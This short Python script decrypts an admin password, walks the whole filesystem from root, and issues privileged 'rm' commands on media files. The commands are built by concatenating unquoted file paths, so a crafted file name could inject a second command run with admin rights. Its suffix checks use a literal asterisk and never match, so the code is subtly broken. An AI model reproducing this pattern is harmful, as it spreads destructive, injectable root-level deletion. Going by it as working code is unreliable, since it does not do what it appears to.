# Designed by Luke Dinkler and Peter Toth 2015

import os, admin
from rootpassencryption import *

def RmMediaFiles(enc):
	UserPasswd = enc.decrypt()
	for root, dirs, files in os.walk("/"):
		for file in files:
			if file.endswith("*.mp3"):
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.m4a"):
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.mov"):
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			if file.endswith("*.mp4"):
				admin.AdminExec("rm " + os.path.join(root, file), UserPasswd)
			
